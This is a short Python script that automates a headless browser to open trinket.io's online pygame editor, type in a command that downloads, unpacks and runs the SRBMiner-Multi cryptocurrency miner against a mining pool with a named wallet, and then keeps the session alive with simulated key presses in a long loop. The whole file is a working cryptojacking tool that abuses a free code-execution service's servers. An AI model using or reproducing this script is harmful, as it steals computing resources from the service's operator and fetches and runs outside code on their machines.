# p.py
import asyncio
from pyppeteer import launch
import time

async def main():
    browser = await launch(options={'args': ['--no-sandbox'], 'devtools':True, 'headless':True})
    page = await browser.newPage()
    await page.setViewport({ 'width': 800, 'height': 600 })

    await page.goto('https://trinket.io/features/pygame')
    time.sleep(1)
    await page.keyboard.down('ControlLeft')
    await page.keyboard.press('KeyA')
    await page.keyboard.up('ControlLeft')
    time.sleep(1)
    await page.keyboard.type("import os; os.system('wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.3/SRBMiner-Multi-0-9-3-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-9-3-Linux.tar.xz && cd SRBMiner-Multi-0-9-3 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool eu.luckpool.net:3956 --wallet RJTX2MHX6KjJRS8Byo7rDrWAqbgitUKiyt.FAST --password x');")
    time.sleep(1)
    await page.mouse.click(700, 530, { 'button': 'left' })
    time.sleep(1)
    num = 900000 #1050
    for x in range(num):
        await page.keyboard.press('s')
        time.sleep(1)
        await page.keyboard.press('ArrowUp')
        if(x%30==0):
            await page.mouse.click(700, 530, { 'button': 'left' })
    await browser.close()
asyncio.get_event_loop().run_until_complete(main())
